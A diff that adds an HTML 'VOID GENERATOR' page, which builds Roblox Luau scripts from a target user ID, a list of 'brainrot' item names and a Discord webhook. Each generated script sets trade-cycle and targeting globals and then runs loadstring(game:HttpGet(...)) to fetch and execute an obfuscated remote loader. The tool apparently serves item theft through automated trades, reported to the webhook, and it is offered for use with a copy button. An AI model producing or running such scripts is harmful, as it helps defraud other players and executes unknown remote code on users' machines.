@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VOID GENERATOR • multi brainrot</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #03050a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 100, 255, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(0, 200, 255, 0.06) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            padding: 24px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card {
+            background: rgba(5, 8, 15, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 40px;
+            border: 1px solid rgba(0, 150, 255, 0.25);
+            overflow: hidden;
+            box-shadow: 0 30px 60px -15px rgba(0, 150, 255, 0.3),
+                        0 0 0 1px rgba(0, 150, 255, 0.1) inset,
+                        0 0 40px rgba(0, 100, 255, 0.2);
+        }
+
+        .header {
+            padding: 22px 28px;
+            border-bottom: 1px solid rgba(0, 150, 255, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            background: rgba(0, 10, 20, 0.4);
+        }
+
+        .time-badge {
+            background: rgba(0, 150, 255, 0.12);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #7ab7ff;
+            border: 1px solid rgba(0, 180, 255, 0.3);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 15px rgba(0, 150, 255, 0.2);
+        }
+
+        .nav {
+            display: flex;
+            gap: 32px;
+            margin-left: auto;
+        }
+
+        .nav a {
+            color: #8a9bb5;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .nav a::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            left: 0;
+            width: 0;
+            height: 3px;
+            background: #0088ff;
+            border-radius: 10px;
+            transition: width 0.3s;
+            box-shadow: 0 0 15px #0088ff;
+        }
+
+        .nav a:hover::after,
+        .nav a.active::after {
+            width: 100%;
+        }
+
+        .nav a:hover,
+        .nav a.active {
+            color: #fff;
+            text-shadow: 0 0 10px #0088ff;
+        }
+
+        .working-bar {
+            background: linear-gradient(90deg, rgba(0, 50, 100, 0.5), rgba(0, 20, 50, 0.8));
+            padding: 16px 28px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            border-bottom: 1px solid rgba(0, 150, 255, 0.3);
+            color: #4db8ff;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            text-shadow: 0 0 15px #0088ff;
+        }
+
+        .working-bar .dot {
+            width: 12px;
+            height: 12px;
+            background: #0088ff;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 20px #0088ff, 0 0 40px #0044ff;
+            animation: pulse 1.8s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(1.1); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .content {
+            padding: 40px 32px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, #fff, #90c8ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+            text-shadow: 0 0 30px rgba(0, 150, 255, 0.3);
+        }
+
+        .subtitle {
+            color: #7f92b0;
+            margin-bottom: 32px;
+            font-size: 17px;
+            font-weight: 500;
+            border-left: 3px solid #0088ff;
+            padding-left: 16px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #b0c6e0;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 18px 22px;
+            background: rgba(10, 15, 25, 0.8);
+            border: 1.5px solid rgba(0, 150, 255, 0.3);
+            border-radius: 20px;
+            font-size: 16px;
+            color: #fff;
+            transition: all 0.3s;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #0088ff;
+            box-shadow: 0 0 0 5px rgba(0, 136, 255, 0.15), 0 0 30px rgba(0, 150, 255, 0.3);
+            background: rgba(15, 22, 36, 0.9);
+        }
+
+        /* Brainrot Multi-Select */
+        .brainrot-section {
+            background: rgba(0, 20, 40, 0.3);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(0, 150, 255, 0.2);
+        }
+
+        .brainrot-input-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .brainrot-input-row input {
+            flex: 1;
+            padding: 16px 20px;
+            background: rgba(10, 15, 25, 0.8);
+            border: 1.5px solid rgba(0, 150, 255, 0.3);
+            border-radius: 18px;
+            font-size: 15px;
+            color: #fff;
+        }
+
+        .add-brainrot-btn {
+            background: linear-gradient(135deg, #0066ff, #0099ff);
+            color: white;
+            border: none;
+            border-radius: 18px;
+            padding: 0 24px;
+            font-weight: 700;
+            font-size: 24px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 5px 15px #0066ff;
+        }
+
+        .add-brainrot-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px #0088ff;
+        }
+
+        .selected-brainrots {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            min-height: 50px;
+        }
+
+        .brainrot-tag {
+            background: linear-gradient(135deg, #0066ff30, #0099ff20);
+            border: 1px solid #0088ff;
+            border-radius: 40px;
+            padding: 10px 18px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #b0e0ff;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 15px rgba(0, 136, 255, 0.3);
+            animation: tagAppear 0.3s ease;
+        }
+
+        @keyframes tagAppear {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .remove-brainrot {
+            background: none;
+            border: none;
+            color: #ff8888;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 0 4px;
+            transition: all 0.2s;
+        }
+
+        .remove-brainrot:hover {
+            color: #ff4d4d;
+            transform: scale(1.2);
+            text-shadow: 0 0 15px #ff0000;
+        }
+
+        .info-note {
+            background: linear-gradient(135deg, rgba(0, 50, 100, 0.4), rgba(0, 20, 50, 0.6));
+            border: 1px solid rgba(0, 180, 255, 0.3);
+            padding: 16px 20px;
+            border-radius: 24px;
+            margin: 20px 0;
+            font-size: 15px;
+            color: #cce4ff;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .info-note svg {
+            width: 22px;
+            height: 22px;
+            fill: #0088ff;
+            flex-shrink: 0;
+            filter: drop-shadow(0 0 10px #0088ff);
+        }
+
+        .generate-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #0066ff, #0099ff);
+            color: #fff;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 20px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0 30px 0;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: 0 10px 30px -5px #0066ff, 0 0 30px #0088ff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .generate-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.7s;
+        }
+
+        .generate-btn:hover::before {
+            left: 100%;
+        }
+
+        .generate-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px -5px #0044ff, 0 0 50px #0088ff;
+        }
+
+        .output-section {
+            background: rgba(0, 10, 20, 0.6);
+            backdrop-filter: blur(15px);
+            border-radius: 28px;
+            padding: 24px;
+            border: 1px solid rgba(0, 150, 255, 0.3);
+            box-shadow: 0 0 40px rgba(0, 100, 255, 0.2);
+        }
+
+        .output-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            font-size: 16px;
+            color: #90b8ff;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .copy-btn {
+            background: rgba(0, 50, 100, 0.5);
+            border: 1px solid #0088ff;
+            color: #b0e0ff;
+            padding: 10px 22px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+
+        .copy-btn:hover {
+            background: #0088ff;
+            border-color: #fff;
+            color: #000;
+            box-shadow: 0 0 30px #0088ff;
+        }
+
+        pre {
+            background: #03050f;
+            padding: 24px;
+            border-radius: 22px;
+            overflow-x: auto;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.7;
+            color: #cfecff;
+            border: 1px solid rgba(0, 150, 255, 0.4);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .features {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 28px;
+            color: #6080b0;
+            font-size: 16px;
+            font-weight: 600;
+            border-top: 1px solid rgba(0, 150, 255, 0.2);
+            padding-top: 24px;
+        }
+
+        .arrow-left {
+            color: #0088ff;
+            font-size: 20px;
+            font-weight: 800;
+            text-shadow: 0 0 15px #0088ff;
+        }
+
+        .counter {
+            margin-left: auto;
+            background: linear-gradient(135deg, #0066ff20, #0099ff10);
+            padding: 6px 16px;
+            border-radius: 60px;
+            font-size: 15px;
+            color: #7ab7ff;
+            border: 1px solid #0088ff60;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="time-badge">✦ 07:54 ✦</div>
+                <div class="nav">
+                    <a href="#" class="active">GENERATOR</a>
+                    <a href="#">TOP</a>
+                    <a href="#">LOGS</a>
+                </div>
+            </div>
+
+            <div class="working-bar">
+                <span class="dot"></span>
+                SYSTEM ONLINE • MULTI BRAINROT ACTIVE
+            </div>
+
+            <div class="content">
+                <h1 class="title"># VOID GENERATOR</h1>
+                <p class="subtitle">Generate LUAU scripts with multiple brainrot selection</p>
+
+                <div class="input-group">
+                    <label>🔵 TARGET USER ID</label>
+                    <input type="text" id="userId" placeholder="e.g. 1234567890" value="505472eo3892">
+                </div>
+
+                <!-- Brainrot Multi-Select Section -->
+                <div class="brainrot-section">
+                    <label style="margin-bottom: 15px; display: block;">🌀 BRAINROTS (MULTI-SELECT)</label>
+                    
+                    <div class="brainrot-input-row">
+                        <input type="text" id="brainrotInput" placeholder="Enter brainrot name (e.g. Titan, Dragon, Hdhs)" value="">
+                        <button class="add-brainrot-btn" id="addBrainrotBtn">+</button>
+                    </div>
+
+                    <div class="selected-brainrots" id="selectedBrainrots">
+                        <!-- Selected brainrots will appear here as tags -->
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>⚡ DISCORD WEBHOOK</label>
+                    <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/.../...">
+                </div>
+
+                <div class="info-note">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                    </svg>
+                    <span><strong>MULTI BRAINROT ACTIVE:</strong> You can add multiple brainrot names. They will appear as: ["Hdhs"] = true, ["Dnnd"] = true</span>
+                </div>
+
+                <button class="generate-btn" id="generateBtn">⟳ GENERATE SCRIPT</button>
+
+                <div class="output-section">
+                    <div class="output-header">
+                        <span>⧩ OUTPUT [MULTI BRAINROT]</span>
+                        <button class="copy-btn" id="copyBtn">📎 COPY SCRIPT</button>
+                    </div>
+                    <pre id="outputScript">-- VOID GENERATOR [multi-brainrot]
+-- encrypted loader | discord webhook enabled
+
+getgenv().WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE"
+getgenv().TARGET_ID = "505472eo3892"
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Titan"] = true,
+    ["Dragon"] = true
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()</pre>
+                </div>
+
+                <div class="features">
+                    <span>FEATURES</span>
+                    <span class="arrow-left">← →</span>
+                    <span class="counter">✦ 69 ONLINE ✦</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // State management
+        let brainrotList = ['Titan', 'Dragon']; // Default brainrots
+        
+        const userIdInput = document.getElementById('userId');
+        const brainrotInput = document.getElementById('brainrotInput');
+        const webhookInput = document.getElementById('webhook');
+        const generateBtn = document.getElementById('generateBtn');
+        const outputScript = document.getElementById('outputScript');
+        const copyBtn = document.getElementById('copyBtn');
+        const addBrainrotBtn = document.getElementById('addBrainrotBtn');
+        const selectedBrainrotsDiv = document.getElementById('selectedBrainrots');
+
+        // Function to render brainrot tags
+        function renderBrainrotTags() {
+            selectedBrainrotsDiv.innerHTML = '';
+            
+            if (brainrotList.length === 0) {
+                selectedBrainrotsDiv.innerHTML = '<span style="color: #4f6f9f; font-style: italic; padding: 10px;">No brainrots selected. Add some above ⬆️</span>';
+                return;
+            }
+
+            brainrotList.forEach((brainrot, index) => {
+                const tag = document.createElement('span');
+                tag.className = 'brainrot-tag';
+                tag.innerHTML = `
+                    ${brainrot}
+                    <button class="remove-brainrot" onclick="removeBrainrot(${index})">✕</button>
+                `;
+                selectedBrainrotsDiv.appendChild(tag);
+            });
+        }
+
+        // Function to add a new brainrot
+        function addBrainrot() {
+            const newBrainrot = brainrotInput.value.trim();
+            
+            if (newBrainrot === '') {
+                alert('Please enter a brainrot name');
+                return;
+            }
+
+            if (brainrotList.includes(newBrainrot)) {
+                alert('This brainrot already exists!');
+                brainrotInput.value = '';
+                return;
+            }
+
+            brainrotList.push(newBrainrot);
+            brainrotInput.value = '';
+            renderBrainrotTags();
+            generateScript(); // Auto-update script when adding
+        }
+
+        // Function to remove a brainrot
+        window.removeBrainrot = function(index) {
+            brainrotList.splice(index, 1);
+            renderBrainrotTags();
+            generateScript(); // Auto-update script when removing
+        };
+
+        // Function to generate the script
+        function generateScript() {
+            const userId = userIdInput.value.trim() || "505472eo3892";
+            let webhook = webhookInput.value.trim();
+
+            if (!webhook) {
+                webhook = "YOUR_DISCORD_WEBHOOK_HERE";
+            }
+
+            // Build the brainrot table
+            let brainrotTable = '';
+            if (brainrotList.length === 0) {
+                brainrotTable = '    -- No brainrots selected';
+            } else {
+                brainrotTable = brainrotList.map(name => `    ["${name}"] = true`).join(',\n');
+            }
+
+            const script = `-- VOID GENERATOR [multi-brainrot]
+-- encrypted loader | discord webhook enabled
+
+getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().TARGET_ID = "${userId}"
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+${brainrotTable}
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()`;
+
+            outputScript.textContent = script;
+        }
+
+        // Event listeners
+        addBrainrotBtn.addEventListener('click', addBrainrot);
+
+        brainrotInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                addBrainrot();
+            }
+        });
+
+        generateBtn.addEventListener('click', generateScript);
+
+        copyBtn.addEventListener('click', async () => {
+            try {
+                await navigator.clipboard.writeText(outputScript.textContent);
+                copyBtn.textContent = '✓ COPIED!';
+                setTimeout(() => {
+                    copyBtn.textContent = '📎 COPY SCRIPT';
+                }, 2000);
+            } catch (err) {
+                copyBtn.textContent = '✗ ERROR';
+                setTimeout(() => {
+                    copyBtn.textContent = '📎 COPY SCRIPT';
+                }, 2000);
+            }
+        });
+
+        // Initialize
+        renderBrainrotTags();
+        window.addEventListener('load', generateScript);
+
+        // Update script when inputs change
+        userIdInput.addEventListener('input', generateScript);
+        webhookInput.addEventListener('input', generateScript);
+    </script>
+</body>
+</html>
